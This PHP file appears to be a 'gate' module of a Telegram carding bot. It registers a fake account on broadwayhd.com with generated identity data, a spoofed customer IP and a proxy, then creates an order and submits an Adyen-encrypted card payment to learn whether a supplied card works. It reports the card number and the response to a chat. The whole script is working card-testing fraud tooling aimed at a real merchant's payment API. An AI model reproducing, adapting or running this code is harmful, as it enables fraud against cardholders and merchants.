<?php

use App\Faker\{Name, Internet, Address};
use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];
const API_KEY = '10001|9364ED0603849A60574BCB338734C63836C762F9FFF5103B11A901B7A5DEE7F7B0146330308989FB7F0DAB52CC793383B2BB6295EBB94979EA68AF8EEE6119C36A06EAE70F17D892A7E8D92CF54F67D3D959863CA64BAB90C38102CDA1143527B79AE13355698BCCC8D931DB6421E6B193F77F828658CFE3E156EF364BF0B26E51125AC81E5B0B2B43BC1A866A0EC738D8D679BB15D9EC1EACA46CD756B1142CEAB794A75F4306854D0278720EC4651B4E34B98850F6852C47DE9257B1A6D14379C3F7386CC2A67884E8A3C8CABD8DCABE72C7F73A8354D107CEEDF28D5E365814CBE28B36CC707BB63256F916FEF2A2F6F90E9E149D93C3B6527295C4DEE9B3';

$encrypt_result = shell_exec(ParseAdyenCli(API_KEY, $cc, trim(Name::firstName()) . ' ' . Name::lastName()) . ' node adyen/encrypt/index.js');
$cse = json_decode($encrypt_result, true);
$mail = Internet::freeEmail();

# ~ REQ 1 ~ #
$header1 = ['accept: */*','content-type: application/json','origin: https://my.broadwayhd.com','referer: https://my.broadwayhd.com/register','user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.113 Safari/537.36'];
    $post1 = '{"operationName":"RegisterUser","variables":{"serviceId":"29ed8750-c986-11e9-87f8-65266d441520","applicationId":"26aefcd0-c988-11e9-ab6e-0196c577d594","deviceType":"web","deviceId":"c867ce5a-2187-4597-b31d-46b3295e48fd","password":"200914.Jv","firstName":"'.Name::firstName().'","lastName":"'.Name::lastName().'","username":"'.$mail.'","currency":"USD","country":"VE","customerIP":"186.26.32.117"},"query":"mutation RegisterUser($serviceId: String!, $applicationId: String!, $deviceType: DeviceType!, $deviceId: String!, $password: String!, $firstName: String!, $lastName: String!, $username: String!, $currency: String!, $customerIP: String!, $country: String) {\n  registerUser(\n    serviceId: $serviceId\n    applicationId: $applicationId\n    deviceType: $deviceType\n    deviceId: $deviceId\n    password: $password\n    firstName: $firstName\n    lastName: $lastName\n    username: $username\n    currency: $currency\n    customerIP: $customerIP\n    country: $country\n  ) {\n    ok\n    statusCode\n    message\n    invalidFields {\n      password\n      firstName\n      lastName\n      username\n      currency\n      customerIP\n      __typename\n    }\n    __typename\n  }\n}\n"}';
    $site1 = ['url' => 'https://my.broadwayhd.com/api/graphql','method' => 'POST', 'post' => $post1, 'headers' => $header1, 'cookie' => null, 'proxy' => $proxy];
    $req1 = Make::Create(1, $site1, $gate, $user);
    IsUnspam($req1, $user);
    Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, $cece, $gate['name'], $lang['wait']));

# ~ REQ 2 ~ #
$header2 = ['accept: */*','content-type: application/json','origin: https://my.broadwayhd.com','referer: https://my.broadwayhd.com/register','user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.113 Safari/537.36'];
    $post2 = '{"operationName":"ShadowLogin","variables":{"password":"200914.Jv","username":"'.$mail.'"},"query":"mutation ShadowLogin($username: String!, $password: String!) {\n  shadowLogin(username: $username, password: $password) {\n    ok\n    statusCode\n    user {\n      jwt\n      refreshToken\n      customerToken\n      __typename\n    }\n    __typename\n  }\n}\n"}';
    $site2 = ['url' => 'https://my.broadwayhd.com/api/graphql','method' => 'POST', 'post' => $post2, 'headers' => $header2, 'cookie' => null, 'proxy' => $proxy];
    $req2 = Make::Create(2, $site2, $gate, $user);
    IsUnspam($req2, $user);
    $jwtoken = CurlX::ParseString($req2->body, '"user":{"jwt":"', '"');
        Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, $cece, $gate['name'], $lang['wait']));

# ~ REQ 3 ~ #
$header3 = ['accept: */*','content-type: application/json','origin: https://my.broadwayhd.com','referer: https://my.broadwayhd.com/register','user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.113 Safari/537.36'];
    $post3 = '{"operationName":"LoginUser","variables":{"serviceId":"29ed8750-c986-11e9-87f8-65266d441520","applicationId":"26aefcd0-c988-11e9-ab6e-0196c577d594","deviceType":"web","deviceId":"1058f2f5-e9a9-4afc-aca4-41e901def616","password":"200914.Jv","username":"'.$mail.'"},"query":"fragment UserFields on User {\n  id\n  firstName\n  lastName\n  currency\n  email\n  country\n  __typename\n}\n\nmutation LoginUser($serviceId: String!, $applicationId: String!, $deviceType: DeviceType!, $deviceId: String!, $username: String!, $password: String!) {\n  loginUser(\n    serviceId: $serviceId\n    applicationId: $applicationId\n    deviceType: $deviceType\n    deviceId: $deviceId\n    username: $username\n    password: $password\n  ) {\n    ok\n    statusCode\n    message\n    token\n    invalidFields {\n      username\n      password\n      profileId\n      __typename\n    }\n    user {\n      ...UserFields\n      __typename\n    }\n    profiles {\n      id\n      userId\n      name\n      defaultProfile\n      selected\n      __typename\n    }\n    __typename\n  }\n}\n"}';
    $site3 = ['url' => 'https://my.broadwayhd.com/api/graphql','method' => 'POST', 'post' => $post3, 'headers' => $header3, 'cookie' => null, 'proxy' => $proxy];
    $req3 = Make::Create(3, $site3, $gate, $user);
    IsUnspam($req3, $user);
    Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, $cece, $gate['name'], $lang['wait']));

# ~ REQ 4 ~ #
$header4 = ['accept: */*','content-type: application/json','origin: https://my.broadwayhd.com','referer: https://my.broadwayhd.com/my-account/subscriptions/add/S815022592_US?type=subscription','user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.113 Safari/537.36'];
    $post4 = '{"operationName":"CreateOrder","variables":{"currency":"USD","offerId":"S815022592_US","country":"US","customerIP":"186.26.32.117","paymentMethodId":123700229,"cleengToken":"'.$jwtoken.'"},"query":"fragment GeneralCleengOrderFields on CleengOrder {\n  id\n  offerId\n  totalPrice\n  paymentMethodId\n  priceBreakdown {\n    offerPrice\n    discountAmount\n    discountedPrice\n    taxValue\n    customerServiceFee\n    paymentMethodFee\n    __typename\n  }\n  discount {\n    applied\n    type\n    __typename\n  }\n  __typename\n}\n\nmutation CreateOrder($cleengToken: String!, $offerId: String!, $country: String!, $currency: String!, $paymentMethodId: Int, $couponCode: String, $customerIP: String) {\n  createOrder(\n    cleengToken: $cleengToken\n    offerId: $offerId\n    country: $country\n    currency: $currency\n    paymentMethodId: $paymentMethodId\n    couponCode: $couponCode\n    customerIP: $customerIP\n  ) {\n    success\n    error {\n      message\n      statusCode\n      __typename\n    }\n    data {\n      ...GeneralCleengOrderFields\n      __typename\n    }\n    __typename\n  }\n}\n"}';
    $site4 = ['url' => 'https://my.broadwayhd.com/api/graphql','method' => 'POST', 'post' => $post4, 'headers' => $header4, 'cookie' => null, 'proxy' => $proxy];
    $req4 = Make::Create(4, $site4, $gate, $user);
    IsUnspam($req4, $user);
    $id = CurlX::ParseString($req4->body, '"id":', ',');
    Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, $cece, $gate['name'], $lang['wait']));

    # ~ REQ 5 ~ #
$header5 = ['accept: */*','content-type: application/json','origin: https://my.broadwayhd.com','referer: https://my.broadwayhd.com/my-account/payment-method/add?methodTypeId='.$id.'','user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.113 Safari/537.36'];
    $post5 = '{"operationName":"AdyenPayment","variables":{"orderId":'.$id.',"cleengToken":"'.$jwtoken.'","customerIP":"186.26.32.117","encryptedCardNumber":"'.$cse['cc'].'","encryptedSecurityCode":"'.$cse['cvc'].'","encryptedExpiryYear":"'.$cse['yy'].'","encryptedExpiryMonth":"'.$cse['mm'].'","type":"scheme"},"query":"fragment GeneralCleengPurchseFields on CleengPurchase {\n  id\n  orderId\n  status\n  offerType\n  paymentMethod\n  paymentGateway\n  externalPaymentId\n  paymentOperation\n  __typename\n}\n\nmutation AdyenPayment($cleengToken: String!, $orderId: Int!, $encryptedCardNumber: String!, $encryptedExpiryMonth: String!, $encryptedExpiryYear: String!, $encryptedSecurityCode: String!, $type: String!, $customerIP: String!) {\n  adyenPayment(\n    cleengToken: $cleengToken\n    orderId: $orderId\n    encryptedCardNumber: $encryptedCardNumber\n    encryptedExpiryMonth: $encryptedExpiryMonth\n    encryptedExpiryYear: $encryptedExpiryYear\n    encryptedSecurityCode: $encryptedSecurityCode\n    type: $type\n    customerIP: $customerIP\n  ) {\n    success\n    error {\n      message\n      statusCode\n      __typename\n    }\n    data {\n      ...GeneralCleengPurchseFields\n      __typename\n    }\n    __typename\n  }\n}\n"}';
    $site5 = ['url' => 'https://my.broadwayhd.com/api/graphql','method' => 'POST', 'post' => $post5, 'headers' => $header5, 'cookie' => null, 'proxy' => $proxy];
    $req5 = Make::Create(5, $site5, $gate, $user);
    IsUnspam($req5, $user);
    Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(3, $cece, $gate['name'], $lang['wait']));
Bot::EditMsgTxt($user['chat_id'], $user['ida'], 'Response: '.$req5->body);
